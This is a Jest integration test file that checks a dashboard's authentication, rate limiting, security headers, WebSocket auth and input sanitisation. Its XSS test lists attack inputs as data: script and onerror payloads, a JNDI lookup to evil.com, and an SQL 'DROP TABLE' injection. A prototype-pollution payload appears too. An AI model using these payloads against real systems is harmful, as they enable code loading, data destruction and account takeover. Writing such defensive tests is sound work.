/**
 * Comprehensive Security Integration Tests for Secured Dashboard
 *
 * These tests validate all security aspects of the production dashboard including:
 * - Authentication and authorization mechanisms
 * - XSS and CSRF protection
 * - Rate limiting and DDoS protection
 * - Input validation and sanitization
 * - Security headers and HTTPS enforcement
 * - Session management and token security
 * - WebSocket security
 * - Data protection and encryption
 */

import request from 'supertest';
import { describe, beforeEach, afterEach, it, expect, jest } from '@jest/globals';
import express from 'express';
import cors from 'cors';
import compression from 'compression';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import { Server } from 'http';
import { Server as SocketIOServer } from 'socket.io';
import { createServer } from 'http';
import path from 'path';
import fs from 'fs';

// Import the actual security components
import { SecurityManager, SECURITY_CONFIG } from '../../monitor/dashboard/security-middleware.js';
import { DatabaseManager } from '../../monitor/dashboard/database-manager.js';

describe('Dashboard Security Integration Tests', () => {
  let app: express.Application;
  let server: Server;
  let io: SocketIOServer;
  let securityManager: SecurityManager;
  let originalEnv: NodeJS.ProcessEnv;

  beforeEach(async () => {
    originalEnv = process.env;
    process.env.NODE_ENV = 'test';
    process.env.JWT_SECRET = 'test-jwt-secret-key-for-testing-only';
    process.env.ALLOWED_ORIGINS = 'http://localhost:3000,http://localhost:3001';
    process.env.DEFAULT_ADMIN_PASSWORD = process.env.TEST_ADMIN_PASSWORD || 'test123';

    // Create test-specific database
    const testDbPath = path.join(__dirname, '../test-data', `test-dashboard-${Date.now()}.db`);
    const testDbDir = path.dirname(testDbPath);
    if (!fs.existsSync(testDbDir)) {
      fs.mkdirSync(testDbDir, { recursive: true });
    }

    // Initialize database manager and security manager
    const dbManager = new DatabaseManager(testDbPath);
    securityManager = new SecurityManager(dbManager);

    // Create Express app with full security middleware
    app = express();

    // Apply security middleware in correct order
    app.use(helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
          scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net"],
          fontSrc: ["'self'", "https://fonts.gstatic.com"],
          imgSrc: ["'self'", "data:", "https:"],
          connectSrc: ["'self'", "ws:", "wss:"],
          frameSrc: ["'none'"],
          objectSrc: ["'none'"]
        }
      }
    }));

    app.use(cors(SECURITY_CONFIG.cors));
    app.use(compression());
    app.use(securityManager.createRateLimiter());
    app.use(securityManager.validateInput.bind(securityManager));
    app.use(express.json({ limit: '10mb' }));
    app.use(express.urlencoded({ extended: true, limit: '10mb' }));

    // Health check endpoint (no auth required)
    app.get('/health', (req, res) => {
      res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        version: '2.0.0',
        security: {
          authentication: 'enabled',
          rateLimit: 'enabled',
          https: 'disabled' // HTTP in test mode
        }
      });
    });

    // Authentication routes
    app.post('/api/auth/login',
      securityManager.createAuthRateLimiter(),
      securityManager.login.bind(securityManager)
    );

    app.post('/api/auth/refresh',
      securityManager.createAuthRateLimiter(),
      securityManager.refreshToken.bind(securityManager)
    );

    app.post('/api/auth/logout',
      securityManager.authenticateToken.bind(securityManager),
      securityManager.logout.bind(securityManager)
    );

    // Protected API routes
    const apiRouter = express.Router();
    apiRouter.use(securityManager.authenticateToken.bind(securityManager));

    // Metrics endpoint (read permission required)
    apiRouter.get('/metrics',
      securityManager.requirePermission('read'),
      (req, res) => {
        res.json({
          timestamp: new Date().toISOString(),
          system: {
            cpuUsage: 45.2,
            memoryUsage: 68.7,
            diskUsage: 32.1
          },
          application: {
            responseTime: { p95: 280 },
            throughput: 1200,
            errorRate: 0.001
          }
        });
      }
    );

    // Benchmark endpoint (write permission required)
    apiRouter.post('/benchmark/:type',
      securityManager.requirePermission('benchmark'),
      securityManager.createApiRateLimiter(),
      (req, res) => {
        const { type } = req.params;
        const allowedTypes = ['cpu', 'memory', 'swarm', 'full'];

        if (!allowedTypes.includes(type)) {
          return res.status(400).json({ error: 'Invalid benchmark type' });
        }

        res.json({
          type,
          timestamp: new Date().toISOString(),
          result: {
            score: Math.random() * 100,
            duration: Math.random() * 1000,
            status: 'completed'
          }
        });
      }
    );

    // Admin-only endpoint
    apiRouter.get('/admin/users',
      securityManager.requirePermission('admin'),
      (req, res) => {
        res.json({
          users: [
            { username: 'admin', role: 'admin', lastLogin: new Date().toISOString() }
          ]
        });
      }
    );

    app.use('/api', apiRouter);

    // Error handling middleware
    app.use((err: Error, req: express.Request, res: express.Response, next: express.NextFunction) => {
      console.error('Security Test Error:', err);
      res.status(500).json({
        error: 'Internal server error',
        message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong',
        timestamp: new Date().toISOString()
      });
    });

    // 404 handler
    app.use('*', (req, res) => {
      res.status(404).json({
        error: 'Not found',
        path: req.originalUrl,
        method: req.method,
        timestamp: new Date().toISOString()
      });
    });

    // Start server
    server = createServer(app);
    await new Promise<void>((resolve) => {
      server.listen(0, resolve);
    });

    // Setup Socket.IO with security
    io = new SocketIOServer(server, {
      cors: SECURITY_CONFIG.cors,
      transports: ['websocket', 'polling'],
      allowEIO3: false,
      maxHttpBufferSize: 1e6,
      pingTimeout: 60000,
      pingInterval: 25000
    });

    // Socket authentication middleware
    io.use(async (socket, next) => {
      try {
        const token = socket.handshake.auth.token;
        if (!token) {
          return next(new Error('Authentication token required'));
        }

        const decoded = jwt.verify(token, SECURITY_CONFIG.jwt.secret) as any;
        socket.data.user = decoded;
        socket.data.authenticated = true;
        next();
      } catch (error) {
        next(new Error('Authentication failed'));
      }
    });

    io.on('connection', (socket) => {
      socket.on('subscribe', (channels) => {
        if (Array.isArray(channels)) {
          channels.forEach(channel => {
            socket.join(channel);
          });
        }
      });

      socket.on('refresh', () => {
        socket.emit('metrics', {
          timestamp: new Date().toISOString(),
          system: { cpuUsage: Math.random() * 100 }
        });
      });
    });
  });

  afterEach(async () => {
    if (server) {
      await new Promise<void>((resolve) => {
        server.close(resolve);
      });
    }
    if (io) {
      io.close();
    }

    // Clean up test database
    const testDbPath = path.join(__dirname, '../test-data');
    if (fs.existsSync(testDbPath)) {
      const files = fs.readdirSync(testDbPath);
      files.forEach(file => {
        if (file.endsWith('.db')) {
          fs.unlinkSync(path.join(testDbPath, file));
        }
      });
    }

    process.env = originalEnv;
    jest.clearAllMocks();
  });

  describe('Authentication and Authorization Security', () => {
    test('should reject requests without authentication token', async () => {
      const response = await request(app)
        .get('/api/metrics')
        .expect(401);

      expect(response.body).toHaveProperty('error', 'Access token required');
    });

    test('should reject requests with invalid JWT token', async () => {
      const response = await request(app)
        .get('/api/metrics')
        .set('Authorization', 'Bearer invalid-token')
        .expect(403);

      expect(response.body).toHaveProperty('error', 'Invalid token');
    });

    test('should reject requests with expired JWT token', async () => {
      // Create expired token
      const expiredToken = jwt.sign(
        { username: 'admin', sessionId: 'test-session' },
        SECURITY_CONFIG.jwt.secret,
        { expiresIn: '-1h' } // Expired 1 hour ago
      );

      const response = await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error', 'Session expired');
    });

    test('should enforce rate limiting on login attempts', async () => {
      const maxAttempts = 5;
      const loginPromises = Array.from({ length: maxAttempts + 2 }, () =>
        request(app)
          .post('/api/auth/login')
          .send({ username: 'admin', password: 'wrongpassword' })
      );

      const results = await Promise.all(loginPromises);

      // First attempts should return 401 (invalid credentials)
      for (let i = 0; i < maxAttempts; i++) {
        expect(results[i].status).toBe(401);
        expect(results[i].body).toHaveProperty('error', 'Invalid credentials');
      }

      // After max attempts, should be rate limited
      expect(results[maxAttempts].status).toBe(429);
      expect(results[maxAttempts].body).toHaveProperty('error', 'Too many authentication attempts');
    });

    test('should enforce role-based permissions', async () => {
      // Login as admin
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Test read permission
      await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      // Test admin permission
      await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      // Test benchmark permission
      await request(app)
        .post('/api/benchmark/cpu')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);
    });

    test('should handle login with secure password hashing', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      expect(response.body).toHaveProperty('accessToken');
      expect(response.body).toHaveProperty('refreshToken');
      expect(response.body).toHaveProperty('user');
      expect(response.body.user).toHaveProperty('username', 'admin');
      expect(response.body.user).toHaveProperty('role', 'admin');
      expect(response.body.user).toHaveProperty('permissions');
      expect(response.body.user).not.toHaveProperty('passwordHash');
    });

    test('should refresh tokens securely', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { refreshToken } = loginResponse.body;

      // Refresh token
      const refreshResponse = await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken })
        .expect(200);

      expect(refreshResponse.body).toHaveProperty('accessToken');
      expect(refreshResponse.body).not.toHaveProperty('refreshToken');

      // New token should work
      await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${refreshResponse.body.accessToken}`)
        .expect(200);
    });

    test('should logout and invalidate tokens', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      // Token should no longer work
      await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(401);
    });
  });

  describe('Input Validation and XSS Protection', () => {
    test('should sanitize query parameters to prevent XSS', async () => {
      const maliciousQueries = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        '<img src=x onerror=alert(1)>',
        '${jndi:ldap://evil.com/x}',
        '"; DROP TABLE users; --'
      ];

      for (const maliciousQuery of maliciousQueries) {
        const response = await request(app)
          .get(`/health?param=${encodeURIComponent(maliciousQuery)}`)
          .expect(200);

        // Response should not contain malicious content
        expect(response.text).not.toContain('<script>');
        expect(response.text).not.toContain('javascript:');
        expect(response.text).not.toContain('DROP TABLE');
      }
    });

    test('should reject oversized payloads', async () => {
      const oversizedPayload = 'x'.repeat(11 * 1024 * 1024); // 11MB

      const response = await request(app)
        .post('/api/auth/login')
        .send({ username: oversizedPayload, password: 'test' })
        .expect(413);

      expect(response.body).toHaveProperty('error', 'Payload too large');
    });

    test('should validate JSON input structure', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'application/json')
        .send('invalid json')
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });

    test('should handle null and undefined values safely', async () => {
      // Login first to get token
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Send null/undefined values
      const response = await request(app)
        .post('/api/benchmark/null')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({ type: null, value: undefined })
        .expect(400);

      expect(response.body).toHaveProperty('error', 'Invalid benchmark type');
    });

    test('should prevent prototype pollution', async () => {
      // Login first to get token
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Attempt prototype pollution
      const maliciousPayload = {
        '__proto__': { isAdmin: true },
        'constructor': { prototype: { isAdmin: true } },
        'type': 'cpu'
      };

      await request(app)
        .post('/api/benchmark/cpu')
        .set('Authorization', `Bearer ${accessToken}`)
        .send(maliciousPayload)
        .expect(200);

      // Verify prototype pollution didn't occur
      expect(Object.prototype).not.toHaveProperty('isAdmin');
      expect({}).not.toHaveProperty('isAdmin');
    });
  });

  describe('Security Headers and CSP', () => {
    test('should include all required security headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      // Check for security headers
      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
      expect(response.headers).toHaveProperty('x-frame-options', 'DENY');
      expect(response.headers).toHaveProperty('x-xss-protection', '1; mode=block');
      expect(response.headers).toHaveProperty('referrer-policy', 'strict-origin-when-cross-origin');
      expect(response.headers).toHaveProperty('content-security-policy');
      expect(response.headers).toHaveProperty('strict-transport-security');
    });

    test('should have proper Content Security Policy', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      const csp = response.headers['content-security-policy'];

      // Verify CSP directives
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("frame-src 'none'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).toContain("connect-src 'self' ws: wss:");
    });

    test('should enforce HTTPS in production', async () => {
      // This test would be for production mode
      // In test mode, HTTPS is disabled, but CSP should still be strict
      const response = await request(app)
        .get('/health')
        .expect(200);

      const csp = response.headers['content-security-policy'];
      expect(csp).toContain("upgrade-insecure-requests");
    });

    test('should include proper CORS headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      expect(response.headers).toHaveProperty('access-control-allow-origin');
      expect(response.headers['access-control-allow-origin']).toBe('http://localhost:3000');
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    test('should enforce general rate limits', async () => {
      const maxRequests = 100;
      const windowMs = 15 * 60 * 1000; // 15 minutes

      // Make rapid requests
      const promises = Array.from({ length: 10 }, () =>
        request(app).get('/health').expect(200)
      );

      const results = await Promise.all(promises);
      results.forEach(response => {
        expect(response.headers).toHaveProperty('x-ratelimit-limit');
        expect(response.headers).toHaveProperty('x-ratelimit-remaining');
      });
    });

    test('should enforce API-specific rate limits', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Make rapid API requests
      const promises = Array.from({ length: 5 }, () =>
        request(app)
          .post('/api/benchmark/cpu')
          .set('Authorization', `Bearer ${accessToken}`)
      );

      const results = await Promise.all(promises);

      // First few should succeed
      results.slice(0, 3).forEach(response => {
        expect([200, 429]).toContain(response.status);
      });

      // Later ones might be rate limited
      const lastResults = results.slice(3);
      const rateLimited = lastResults.filter(r => r.status === 429);
      if (rateLimited.length > 0) {
        rateLimited.forEach(response => {
          expect(response.body).toHaveProperty('error', 'API rate limit exceeded');
        });
      }
    });

    test('should handle concurrent requests gracefully', async () => {
      const concurrentRequests = 50;
      const promises = Array.from({ length: concurrentRequests }, () =>
        request(app).get('/health')
      );

      const results = await Promise.all(promises);

      // Most should succeed, some might be rate limited
      const successful = results.filter(r => r.status === 200);
      const rateLimited = results.filter(r => r.status === 429);

      expect(successful.length + rateLimited.length).toBe(concurrentRequests);

      if (rateLimited.length > 0) {
        rateLimited.forEach(response => {
          expect(response.body).toHaveProperty('error');
        });
      }
    });
  });

  describe('WebSocket Security', () => {
    test('should reject WebSocket connections without authentication', async () => {
      const client = require('socket.io-client')(`http://localhost:${server.address().port}`, {
        transports: ['websocket']
      });

      await new Promise<void>((resolve) => {
        client.on('connect_error', (error) => {
          expect(error.message).toBe('Authentication failed');
          client.close();
          resolve();
        });
      });
    });

    test('should allow authenticated WebSocket connections', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      const client = require('socket.io-client')(`http://localhost:${server.address().port}`, {
        transports: ['websocket'],
        auth: { token: accessToken }
      });

      await new Promise<void>((resolve) => {
        client.on('connect', () => {
          expect(client.connected).toBe(true);
          client.close();
          resolve();
        });
      });
    });

    test('should validate WebSocket event names and data', async () => {
      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      const client = require('socket.io-client')(`http://localhost:${server.address().port}`, {
        transports: ['websocket'],
        auth: { token: accessToken }
      });

      await new Promise<void>((resolve) => {
        client.on('connect', () => {
          // Test valid event
          client.emit('subscribe', ['metrics']);

          // Test suspicious event name
          client.emit('a'.repeat(200), 'data');

          client.on('connect_error', (error) => {
            expect(error.message).toBe('Invalid event');
            client.close();
            resolve();
          });

          setTimeout(() => {
            client.close();
            resolve();
          }, 100);
        });
      });
    });
  });

  describe('Session Security and Token Management', () => {
    test('should create secure JWT tokens', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken, refreshToken } = response.body;

      // Verify JWT structure
      const decodedAccess = jwt.decode(accessToken) as any;
      const decodedRefresh = jwt.decode(refreshToken) as any;

      expect(decodedAccess).toHaveProperty('username', 'admin');
      expect(decodedAccess).toHaveProperty('sessionId');
      expect(decodedAccess).toHaveProperty('iat');
      expect(decodedAccess).toHaveProperty('exp');

      expect(decodedRefresh).toHaveProperty('username', 'admin');
      expect(decodedRefresh).toHaveProperty('sessionId');
      expect(decodedRefresh).toHaveProperty('iat');
      expect(decodedRefresh).toHaveProperty('exp');

      // Refresh token should have longer expiration
      expect(decodedRefresh.exp).toBeGreaterThan(decodedAccess.exp);
    });

    test('should handle session expiration gracefully', async () => {
      // Create token with very short expiration
      const shortLivedToken = jwt.sign(
        { username: 'admin', sessionId: 'test-session' },
        SECURITY_CONFIG.jwt.secret,
        { expiresIn: '1ms' }
      );

      // Wait for token to expire
      await new Promise(resolve => setTimeout(resolve, 10));

      const response = await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${shortLivedToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error', 'Session expired');
    });

    test('should prevent token reuse after logout', async () => {
      // Login
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      // Try to use token again
      const response = await request(app)
        .get('/api/metrics')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error', 'Session expired');
    });
  });

  describe('Error Handling and Information Disclosure', () => {
    test('should not leak sensitive information in error messages', async () => {
      const response = await request(app)
        .get('/api/nonexistent')
        .set('Authorization', 'Bearer invalid-token')
        .expect(404);

      expect(response.body).toHaveProperty('error', 'Not found');
      expect(response.body).toHaveProperty('path', '/api/nonexistent');
      expect(response.body).toHaveProperty('method', 'GET');
      expect(response.body).not.toContain('invalid-token');
      expect(response.body).not.toContain('jwt');
      expect(response.body).not.toContain('secret');
    });

    test('should handle malformed requests safely', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'application/json')
        .send('{"username": "admin", "password": "test"')
        .expect(400);

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).not.toContain('admin');
      expect(response.body.error).not.toContain('test');
    });

    test('should log security events appropriately', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

      // Trigger security events
      await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'wrongpassword' });

      await request(app)
        .get('/api/metrics')
        .set('Authorization', 'Bearer invalid-token');

      // Verify security events were logged
      expect(consoleSpy).toHaveBeenCalledWith(
        expect.stringContaining('SECURITY EVENT')
      );

      consoleSpy.mockRestore();
    });
  });

  describe('Performance Under Security Load', () => {
    test('should maintain response times with security middleware', async () => {
      const startTime = performance.now();

      // Make multiple requests
      const promises = Array.from({ length: 10 }, () =>
        request(app).get('/health')
      );

      await Promise.all(promises);
      const endTime = performance.now();
      const averageTime = (endTime - startTime) / 10;

      // Should respond within reasonable time despite security checks
      expect(averageTime).toBeLessThan(100); // 100ms average
    });

    test('should handle authentication requests efficiently', async () => {
      const startTime = performance.now();

      await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' });

      const endTime = performance.now();
      const responseTime = endTime - startTime;

      // Authentication should be fast (includes bcrypt comparison)
      expect(responseTime).toBeLessThan(1000); // 1 second max for bcrypt
    });

    test('should maintain security under concurrent load', async () => {
      const concurrentRequests = 20;
      const startTime = performance.now();

      // Login first
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password: 'test123' })
        .expect(200);

      const { accessToken } = loginResponse.body;

      // Make concurrent authenticated requests
      const promises = Array.from({ length: concurrentRequests }, () =>
        request(app)
          .get('/api/metrics')
          .set('Authorization', `Bearer ${accessToken}`)
      );

      const results = await Promise.all(promises);
      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // Most requests should succeed
      const successful = results.filter(r => r.status === 200);
      expect(successful.length).toBeGreaterThan(concurrentRequests * 0.8);

      // Should handle concurrent load efficiently
      expect(totalTime).toBeLessThan(2000); // 2 seconds total
    });
  });
});